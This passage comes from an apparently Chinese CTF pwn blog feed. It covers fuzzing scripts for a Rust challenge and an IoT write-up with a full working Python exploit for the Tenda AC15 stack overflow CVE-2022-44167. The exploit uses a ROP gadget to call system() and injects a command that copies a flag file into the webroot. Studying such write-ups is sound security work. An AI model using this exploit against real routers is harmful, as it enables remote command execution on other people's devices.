content</span><br><span class="line">2. edit message</span><br><span class="line">3. show message</span><br><span class="line">4. old content</span><br><span class="line">5. content info</span><br><span class="line">6. <span class="built_in">exit</span></span><br><span class="line">choice:</span><br><span class="line"></span><br><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line">0x0000555555562010 <span class="keyword">in</span> ?? ()</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">─────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────</span><br><span class="line">*RAX  0x555555562010 ◂— 0x0</span><br><span class="line">*RBX  0x7fffffffdb28 —▸ 0x555555574260 ◂— 0x0</span><br><span class="line">*RCX  0x55555555a140 ◂— 0xffffd6f0ffffd518</span><br><span class="line">*RDX  0x555555558dc0 (content::<span class="built_in">set</span>()) ◂— endbr64 </span><br><span class="line">*RDI  0x5555555741d0 —▸ 0x555555574280 ◂— 0x0</span><br><span class="line"> RSI  0x0</span><br><span class="line">*R8   0x555555574260 ◂— 0x0</span><br><span class="line"> R9   0x0</span><br><span class="line">*R10  0x7ffff7d5eac0 (_nl_C_LC_CTYPE_toupper+512) ◂— 0x100000000</span><br><span class="line">*R11  0x7ffff7d5f3c0 (_nl_C_LC_CTYPE_class+256) ◂— 0x2000200020002</span><br><span class="line">*R12  0x7fffffffdb30 ◂— <span class="string">&#x27;   2    &#x27;</span></span><br><span class="line">*R13  0x555555573eb0 —▸ 0x5555555741d0 —▸ 0x555555574280 ◂— 0x0</span><br><span class="line">*R14  0x7fffffffdb28 —▸ 0x555555574260 ◂— 0x0</span><br><span class="line">*R15  0xffffffff0000</span><br><span class="line">*RBP  0x5555555741d0 —▸ 0x555555574280 ◂— 0x0</span><br><span class="line">*RSP  0x7fffffffda88 —▸ 0x555555557f45 (task_handle(std::unique_ptr&lt;page_hander, std::default_delete&lt;page_hander&gt; &gt;)+3749) ◂— <span class="built_in">test</span> al, al</span><br><span class="line">*RIP  0x555555562010 ◂— 0x0</span><br><span class="line">──────────────────────────────[ DISASM / x86-64 / <span class="built_in">set</span> <span class="built_in">emulate</span> on ]──────────────────────────────</span><br><span class="line"> ► 0x555555562010    add    byte ptr [rax], al</span><br><span class="line">    ↓</span><br><span class="line">   0x555555562010   add    byte ptr [rax], al</span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">xxd <span class="built_in">id</span>\:000000\,sig\:11\,src\:000000\,time\:1804\,execs\:69\,op\:quick\,pos\:8 </span><br><span class="line">00000000: 2020 2020 2020 2031 8720 2036 2020 2020         1.  6    </span><br><span class="line">00000010: 2020 2030 2020 2020 2020 3631 2020 2020     0      61    </span><br><span class="line">00000020: 2020 2031 2020 2020 2031 3937 2020 2020     1     197    </span><br><span class="line">00000030: 2020 2032 2020 2020 2031 3332 2020 2020     2     132    </span><br><span class="line">00000040: 2020 2033 2020 2020 2020 3839 2020 2020     3      89    </span><br><span class="line">00000050: 2020 2034 2020 2020 2031 3831 2020 2020     4     181    </span><br><span class="line">00000060: 2020 2035 2020 2020 2031 3230 2020 2020     5     120    </span><br><span class="line">00000070: 2020 2036                                   6</span><br></pre></td></tr></table></figure><h2 id="非标准fuzz"><a href="#非标准fuzz" class="headerlink" title="非标准fuzz"></a>非标准fuzz</h2><p>只需要一个能随机生成语料的引擎，然后一直把语料喂给目标就可以了，所以只要一个简单的 shell 脚本就可以了</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="keyword">while</span> ((<span class="number">1</span>))</span><br><span class="line"><span class="keyword">do</span> </span><br><span class="line">    ./dumper gen &gt; poc</span><br><span class="line">    <span class="built_in">cat</span> poc | ./byteview</span><br><span class="line">    <span class="keyword">if</span> [ $? -ne 0 ]; <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">break</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure><p>不过这个没有用 qasan，找不出 UAF 这样可能不会 crash 的洞，可以使用 qasan 可能会更快的发现</p><p>大佬的总结</p><blockquote><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul><li><p>如果要用 qasan，直接用 AFLplusplus 的 qemu-mode 起可能会更方便</p></li><li><p>如果要使用真正的 AFLplusplus + protobuf 实现基于覆盖率的结构化感知 fuzz，那么在实现</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">afl_custom_fuzz</span><br></pre></td></tr></table></figure><p>时可以用 libprotobuf-mutator 提供的变异器对输入的数据（序列化的 protobuf）进行变异，然后通过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">afl_custom_post_process</span><br></pre></td></tr></table></figure><p>筛选变异的数据，对于可以反序列化的数据反序列化并格式化为目标程序可以接受的输入。对于 byteview 这题，由于 new_content 中的 datas 的个数与 sum_of_datas 有关，其实也可以在这里筛选正确的变异结果。注意这种情况下需要提供正确的语料，可以用 dumper 输出序列化的 protobuf 来构造语料。</p><ul><li>对于这种方法，我个人认为并不高效，我个人不太信任 libprotobuf-mutator 的变异效果。不过如果尝试对 byteview 这题进行这样的测试，有可能会发现效率非常高，也可能会发现效率非常低。为什么会出现这种结果？因为这种情况下是基于语料库进行变异的，语料库的质量决定了 fuzz 的速度，而实际上随机生成一个语料，还是有比较高的概率产生可以让目标程序直接 crash，或者稍微变异一下就 crash 的语料的（也就是很容易就产出超高质量的语料）。</li></ul></li><li><p>关于 <code>AFL_CUSTOM_MUTATOR_ONLY</code> 的设置与否，如果不设置该变量，用户提供的变异器只会在 havoc 阶段（undetermined mutate 的第一个阶段）前进行一次变异，其余情况会由 AFL 进行变异，我觉得由 AFL 直接对序列化的数据进行变异，可能会变异出无意义的数据，应当全权交给 libprotobuf-mutator 来变异，所以感觉还是需要设置的。</p></li></ul><h3 id="不足与改进"><a href="#不足与改进" class="headerlink" title="不足与改进"></a>不足与改进</h3><p>如前文所述，这种 fuzz 方式（也就是用 qasan + 结构化随机输入）非常适合找出 CTF 传统堆题由申请释放触发的 UAF 等漏洞的 poc。不足主要在于</p><ul><li>如果目标程序使用了 read 等对输入要求较高的读取函数时（即对非法输入的鲁棒性较差），需要多花点时间对输入进行格式化，避免非法输入导致程序爆炸</li><li>对于触发条件比较微妙的漏洞可能会比较难以发现。</li><li>适配工作比较多，会浪费很多时间</li></ul><p>所以其实，这种 fuzz 方法最适合的就是漏洞本身很简单，但是程序比较难以分析的题目。这种题没做出来会在赛后给选手很大的心理伤害，在赛时无路可走了，也不妨尝试乱 fuzz 一下，也可以少点遗憾。</p><p>如果要改进，我个人的想法有如下：</p><ul><li>使用 libprotobuf-mutator 进行变异，并且自己重写 mutator 方法，实现对变异更精确的控制</li><li>真正与 AFL 整合，也就是提供给 AFL 进行变异的语料应当是反序列化的数据，这样可以利用 AFL 提供的变异算法，可能可以达到更高的覆盖率，也许可以发现一些比较“subtle”的洞。然后我们在 havoc 阶段前进行结构化的变异，指导 AFL 生成高度结构化的输入。不过如果让 AFL 进行变异，可能需要目标程序有较高的鲁棒性（毕竟 ctf 题不是工业程序，乱输一气程序会炸并不影响选手拿不到 flag）。</li><li>关于溢出类型的洞，可以对变异器的 size 要进行变异，生成可能会超过 buf 的 string，从修改的角度来看这其实没啥难度，这里没这么做，主要原因是目标程序鲁棒性较差，并且分析的时候也看得出来是不会有溢出的。换句话说，如果有溢出的洞，ctf 中一般是能直接看出来的，那也没必要去搞什么 fuzz，花里胡哨的没必要，有这个适配的时间估计硬看也能看出来了。不过对于 realworld 的东西，感觉不妨一试。</li></ul></blockquote><h1 id="虎符安全2022-vdq"><a href="#虎符安全2022-vdq" class="headerlink" title="虎符安全2022-vdq"></a>虎符安全2022-vdq</h1><p>rust语言写的程序,静态分析应该也是很难的</p><p>说实话怎么交互都需要研究半天,不过好在没有去除符号,结合调试以及gpt的话至少能整明白交互方式(没有rust基础依然不是很容易orz)</p><p>一些rust方法可以参考<a href="https://rustwiki.org/zh-CN/std/">std - Rust (rustwiki.org)</a></p><p>在<code>vdq::get_opr_lst</code>中有一个循环不停的读取行,每一次会判断是否以<code>$</code>符号开始</p><p>如果是的话则结束读取,不是的话则累积到一个字符串中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">v8 = <span class="string">&quot;$Cached notes:\nArchive note []\nAppend with message : \nRemoved note [&quot;</span>;</span><br><span class="line">v9 = <span class="number">1LL</span>;<span class="comment">//指定字符串比较长度</span></span><br><span class="line">v5.data_ptr = (u8 *)v6;</span><br><span class="line">v5.length = (usize)v15;</span><br><span class="line"><span class="keyword">if</span> ( core::str::_$LT$impl$u20$str$GT$::starts_with::he12bd255c6661204(v5, *(_str *)&amp;v8) )</span><br><span class="line">&#123;</span><br><span class="line">  core::ptr::drop_in_place::h651d4c9afc9ff69a(&amp;v26);</span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后就进入反序列化环节<code>serde_json::de::from_str::h2ed086b1a84205ca(&amp;v29, v12);</code></p><p>这里看不出什么,但程序之后的运行就取决于这个函数的返回结果,所以进入看看,因为是反序列化的函数所以内容稍微有一点复杂</p><p>不过可以看到其返回值</p><p><code>return (core::result::Result&lt;alloc::vec::Vec&lt;vdq::Operation&gt;,serde_json::error::Error&gt; *)read.delegate.slice.data_ptr;</code></p><p>在ida的local_types中找到了vdq::Operation的定义,这是一个枚举类型</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">FFFFFFFF ; <span class="class"><span class="keyword">enum</span> <span class="title">vdq</span>:</span>:Operation, copyof_397, width <span class="number">1</span> byte</span><br><span class="line">FFFFFFFF vdq::Operation::Add  = <span class="number">0</span></span><br><span class="line">FFFFFFFF vdq::Operation::Remove  = <span class="number">1</span></span><br><span class="line">FFFFFFFF vdq::Operation::Append  = <span class="number">2</span></span><br><span class="line">FFFFFFFF vdq::Operation::Archive  = <span class="number">3</span></span><br><span class="line">FFFFFFFF vdq::Operation::View  = <span class="number">4</span></span><br></pre></td></tr></table></figure><p>所以我们需要一次性输入所有的操作,类似这样</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">[</span><span class="string">&quot;Add&quot;</span><span class="punctuation">,</span><span class="string">&quot;Remove&quot;</span><span class="punctuation">]</span></span><br></pre></td></tr></table></figure><p>然后再起一行输入<code>$</code></p><p>采用如下fuzz</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># fuzz.sh</span></span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"><span class="keyword">while</span> ((<span class="number">1</span>))</span><br><span class="line"><span class="keyword">do</span> </span><br><span class="line">    python ./vdq_input_gen.py &gt; poc</span><br><span class="line">    <span class="built_in">cat</span> poc | ./vdq</span><br><span class="line">    <span class="keyword">if</span> [ $? -ne 0 ]; <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">break</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># vdq_input_gen.py</span></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">operations = <span class="string">&quot;[&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Add</span>():</span><br><span class="line">    <span class="keyword">global</span> operations</span><br><span class="line">    operations += <span class="string">&quot;\&quot;Add\&quot;, &quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Remove</span>():</span><br><span class="line">    <span class="keyword">global</span> operations</span><br><span class="line">    operations += <span class="string">&quot;\&quot;Remove\&quot;, &quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Append</span>():</span><br><span class="line">    <span class="keyword">global</span> operations</span><br><span class="line">    operations += <span class="string">&quot;\&quot;Append\&quot;, &quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">View</span>():</span><br><span class="line">    <span class="keyword">global</span> operations</span><br><span class="line">    operations += <span class="string">&quot;\&quot;View\&quot;, &quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Archive</span>():</span><br><span class="line">    <span class="keyword">global</span> operations</span><br><span class="line">    operations += <span class="string">&quot;\&quot;Archive\&quot;, &quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">DoOperations</span>():</span><br><span class="line">    <span class="built_in">print</span>(operations[:-<span class="number">2</span>] + <span class="string">&quot;]&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;$&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">DoAdd</span>(<span class="params">message</span>):</span><br><span class="line">    <span class="built_in">print</span>(message)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">DoAppend</span>(<span class="params">message</span>):</span><br><span class="line">    <span class="built_in">print</span>(message)</span><br><span class="line"></span><br><span class="line">total_ops = random.randint(<span class="number">1</span>, <span class="number">100</span>)</span><br><span class="line">total_adds = <span class="number">0</span></span><br><span class="line">total_append = <span class="number">0</span></span><br><span class="line">total_remove = <span class="number">0</span></span><br><span class="line">total_message = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(total_ops):</span><br><span class="line">    op = random.randint(<span class="number">0</span>, <span class="number">4</span>)</span><br><span class="line">    <span class="keyword">if</span> op == <span class="number">0</span>:</span><br><span class="line">        total_message += <span class="number">1</span></span><br><span class="line">        total_adds += <span class="number">1</span></span><br><span class="line">        Add()</span><br><span class="line">    <span class="keyword">elif</span> op == <span class="number">1</span>:</span><br><span class="line">        total_adds -= <span class="number">1</span></span><br><span class="line">        Remove()</span><br><span class="line">    <span class="keyword">elif</span> op == <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">if</span> total_adds &gt; <span class="number">0</span>:</span><br><span class="line">            total_append += <span class="number">1</span></span><br><span class="line">            total_message += <span class="number">1</span></span><br><span class="line">            Append()</span><br><span class="line">        Append()</span><br><span class="line">    <span class="keyword">elif</span> op == <span class="number">3</span>:</span><br><span class="line">        total_adds = <span class="number">0</span></span><br><span class="line">        total_append = <span class="number">0</span></span><br><span class="line">        total_remove = <span class="number">0</span></span><br><span class="line">        Archive()</span><br><span class="line">    <span class="keyword">elif</span> op == <span class="number">4</span>:</span><br><span class="line">        View()</span><br><span class="line">DoOperations()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(total_message):</span><br><span class="line">    DoAdd(<span class="string">&#x27;&#x27;</span>.join(random.sample(string.ascii_letters + string.digits, random.randint(<span class="number">1</span>, <span class="number">40</span>))))</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">Scared</summary>
    
    
    
    <category term="pwn" scheme="https://ixout.github.io/categories/pwn/"/>
    
    
    <category term="fuzz" scheme="https://ixout.github.io/tags/fuzz/"/>
    
  </entry>
  
  <entry>
    <title>几道iotpwn题目复现</title>
    <link href="https://ixout.github.io/posts/2980/"/>
    <id>https://ixout.github.io/posts/2980/</id>
    <published>2024-05-12T13:59:00.000Z</published>
    <updated>2024-05-16T02:35:42.939Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://blingblingxuanxuan.github.io/2021/02/03/hws2021-winter/#blinkblink">HWS 2021 冬令营选拔赛 | blingbling’s blog (blingblingxuanxuan.github.io)</a></p><p><a href="https://www.secpulse.com/archives/195239.html">RWCTF 5th Shellfind复现 - SecPulse.COM | 安全脉搏</a></p><p><a href="https://xz.aliyun.com/t/12405?time__1311=mqmhD5AKDIejOxBT4%2BxCu8BDuDAgvigQYD&amp;alichlgref=https%3A%2F%2Fcn.bing.com%2F">RWCTF 5th ShellFind分析 - 先知社区 (aliyun.com)</a></p><p>这几题应该比较有概括性</p><h1 id="HITCTF2023-router"><a href="#HITCTF2023-router" class="headerlink" title="HITCTF2023-router"></a>HITCTF2023-router</h1><p>要是复现过Tenda AC15的漏洞的话,打开httpd应该一眼能够认出来这个就是TendaAc15的固件</p><p>这里选择CVE-2022-44167,但是这个cve网上没找到公开的poc,但我们可以自己分析</p><p>可以知道这个漏洞是formSetPPTPServer函数中存在一个栈溢出漏洞,注意到</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( <span class="built_in">sscanf</span>(v20, <span class="string">&quot;%[^.].%[^.].%[^.].%s&quot;</span>, v13, v14, v15, &amp;v15[<span class="number">8</span>]) != <span class="number">4</span></span><br><span class="line">  || <span class="built_in">sscanf</span>(v19, <span class="string">&quot;%[^.].%[^.].%[^.].%s&quot;</span>, &amp;v9, &amp;v10, &amp;v11, v12) != <span class="number">4</span> )</span><br></pre></td></tr></table></figure><p>这段代码本意是将输入的点分十进制的 ip 地址按点分隔开将字符串写到栈上。</p><p>但也可以看到其并没有对长度进行检查,这显然是极其危险的</p><p>向上追溯可以看到</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">v20 = (<span class="type">char</span> *)sub_2B794(a1, <span class="string">&quot;startIp&quot;</span>, &amp;unk_EFE14);</span><br><span class="line">v19 = (<span class="type">char</span> *)sub_2B794(a1, <span class="string">&quot;endIp&quot;</span>, &amp;unk_EFE14);</span><br></pre></td></tr></table></figure><p><code>sub_2B794</code>函数大致是在参数a1中寻找字符串<code>startIp</code></p><p>那么如何调用到这个函数呢,向上追溯,发现了这个</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">sub_16EF4(<span class="string">&quot;SetPptpServerCfg&quot;</span>, formSetPPTPServer);</span><br><span class="line"></span><br><span class="line">  sub_176B0(&amp;unk_D8894, <span class="number">0</span>, <span class="number">0</span>, R7WebsSecurityHandler, <span class="number">1</span>);</span><br><span class="line">  sub_176B0(<span class="string">&quot;/goform&quot;</span>, <span class="number">0</span>, <span class="number">0</span>, websFormHandler, <span class="number">0</span>);</span><br><span class="line">  sub_176B0(<span class="string">&quot;/cgi-bin&quot;</span>, <span class="number">0</span>, <span class="number">0</span>, webs_Tenda_CGI_BIN_Handler, <span class="number">0</span>);</span><br><span class="line">  sub_176B0(&amp;unk_D8894, <span class="number">0</span>, <span class="number">0</span>, websDefaultHandler, <span class="number">2</span>);</span><br><span class="line">  sub_41F18();</span><br><span class="line">  sub_176B0(<span class="string">&quot;/&quot;</span>, <span class="number">0</span>, <span class="number">0</span>, sub_2E9D8, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%s %d: websOpenServer failed\n&quot;</span>, <span class="string">&quot;initWebs&quot;</span>, <span class="number">499</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再往上追溯一两层就能知道这是cgi处理部分</p><p>也就是说访问这样的url<code>/goform/SetPptpServerCfg?img/main.logo.png</code>就能触发函数了</p><p>调试时注意到，当 formSetPPTPServer  返回时，寄存器 r5  的值是指向 <code>/goform/SetPptpServerCfg? img/main-logo.png</code></p><p>这一字符串的地址。我们可以在 url 后面接上其他内容。即这一字符串是我们可控 的。我们找到一条这样的gadget: </p><p><code>0x000cd1ac: mov r0, r5; add sp, sp, #0x8c pop &#123;r4, r5, r6, r7, r8, sb, sl, fp, pc&#125;;</code> </p><p>可以将 r5  寄存器的值赋给 r0,  并控制 system@plt . pc  寄存器使其跳转到 因此我们要做的事情就是：在 url 尾部插入我们要执行的命令，构造 startIp  以产生溢出，通过两次溢出 来写两个我们需要的地址。</p><p>最终exp:</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="comment"># 0x000cd1ac: mov r0, r5; add sp, sp, #0x8c pop &#123;r4, r5, r6, r7, r8, sb, sl, fp, pc&#125;;</span></span><br><span class="line">gadget_addr = <span class="number">0x000cd1ac</span></span><br><span class="line">system_plt = <span class="number">0x0000eb18</span></span><br><span class="line">payload_v16 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x184</span> + <span class="string">b&#x27;b&#x27;</span>*<span class="number">4</span> + <span class="string">b&#x27;c&#x27;</span>*<span class="number">0x8c</span> + <span class="string">b&#x27;d&#x27;</span>*<span class="number">4</span>*<span class="number">8</span> + <span class="string">b&#x27;\x18\xeb&#x27;</span></span><br><span class="line">payload_v17 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x17c</span> +  <span class="string">b&#x27;\xac\xd1\x0c&#x27;</span></span><br><span class="line">cmd = <span class="string">&quot;mkdir /webroot;cat /root/flag&gt;/webroot/favicon.ico&quot;</span>.replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;$&#123;IFS&#125;&quot;</span>)</span><br><span class="line">paramdata = &#123;</span><br><span class="line"><span class="string">&quot;startIp&quot;</span>: <span class="string">b&#x27;.&#x27;</span>.join([payload_v16, payload_v17]),</span><br><span class="line"><span class="string">&quot;endIp&quot;</span>: <span class="string">b&#x27;1.1.1.1&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">print</span>(paramdata)</span><br><span class="line">host = <span class="string">&quot;localhost&quot;</span></span><br><span class="line">port = <span class="number">80</span></span><br><span class="line">path = <span class="string">f&quot;/goform/SetPptpServerCfg?img/main-logo.png;<span class="subst">&#123;cmd&#125;</span>&quot;</span></span><br><span class="line">url = <span class="string">f&quot;http://<span class="subst">&#123;host&#125;</span>:<span class="subst">&#123;port&#125;</span><span class="subst">&#123;path&#125;</span>&quot;</span></span><br><span class="line">http_header = <span class="string">f&quot;&quot;&quot;POST <span class="subst">&#123;path&#125;</span> HTTP/1.1 \r</span></span><br><span class="line"><span class="string">HOST: <span class="subst">&#123;host&#125;</span>:<span class="subst">&#123;port&#125;</span>\r</span></span><br><span class="line"><span class="string">Pragma: no-cache\r</span></span><br><span class="line"><span class="string">Cache-Control: no-cache\r</span></span><br><span class="line"><span class="string">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, </span></span><br><span class="line"><span class="string">like Gecko) Chrome/116.0.0.0 Safari/537.36\r</span></span><br><span class="line"><span class="string">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8</span></span><br><span class="line"><span class="string">Connection: close\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>.encode()</span><br><span class="line">http_body = <span class="string">b&quot;startIp=&quot;</span> + paramdata[<span class="string">&quot;startIp&quot;</span>] + <span class="string">b&quot;&amp;endIp=&quot;</span> + paramdata[<span class="string">&quot;endIp&quot;</span>]</span><br><span class="line">io = remote(host, port)</span><br><span class="line">io.send(http_header + http_body)</span><br><span class="line"><span class="comment"># wait for httpd re-open</span></span><br><span class="line">sleep(<span class="number">20</span>)</span><br><span class="line">r = requests.get(<span class="string">f&quot;http://<span class="subst">&#123;host&#125;</span>:<span class="subst">&#123;port&#125;</span>/favicon.ico&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure><p>插入的命令是<code>mkdir$&#123;IFS&#125;/webroot;cat$&#123;IFS&#125;/root/flag&gt;/webroot/favicon.ico</code> 。这段命令向 /webroot/favicon.ico  中写入 flag ,之后访问 <code>http://host:port/favicon.ico</code> 就可以拿到 flag</p><h1 id="HWS2021冬令营选拔赛-blinkblink"><a href="#HWS2021冬令营选拔赛-blinkblink" class="headerlink" title="HWS2021冬令营选拔赛-blinkblink"></a>HWS2021冬令营选拔赛-blinkblink</h1><p>因为没有远程的环境,自己模拟好像有点问题,于是远程测试这部分直接cv大佬的</p><p>nc连上给的ip</p><p><a href="https://blingblingxuanxuan.github.io/2021/02/03/hws2021-winter/blinkblink1.png"><img src="https://blingblingxuanxuan.github.io/2021/02/03/hws2021-winter/blinkblink1.png" alt="img"></a></p><p>浏览器打开</p><p><a href="https://blingblingxuanxuan.github.io/2021/02/03/hws2021-winter/blinkblink2.png"><img src="https://blingblingxuanxuan.github.io/2021/02/03/hws2021-winter/blinkblink2.png" alt="img"></a></p><p>尝试登陆，查看网页文件源码</p><p><a href="https://blingblingxuanxuan.github.io/2021/02/03/hws2021-winter/blinkblink3.png"><img src="https://blingblingxuanxuan.github.io/2021/02/03/hws2021-winter/blinkblink3.png" alt="img"></a></p><p>发现getinfo.js中有url，尝试访问</p><p><a href="https://blingblingxuanxuan.github.io/2021/02/03/hws2021-winter/blinkblink4.png"><img src="https://blingblingxuanxuan.github.io/2021/02/03/hws2021-winter/blinkblink4.png" alt="img"></a></p><p>有返回值</p><p><a href="https://blingblingxuanxuan.github.io/2021/02/03/hws2021-winter/blinkblink5.png"><img src="https://blingblingxuanxuan.github.io/2021/02/03/hws2021-winter/blinkblink5.png" alt="img"></a></p><p>该js中有144个url</p><p><a href="https://blingblingxuanxuan.github.io/2021/02/03/hws2021-winter/blinkblink6.png"><img src="https://blingblingxuanxuan.github.io/2021/02/03/hws2021-winter/blinkblink6.png" 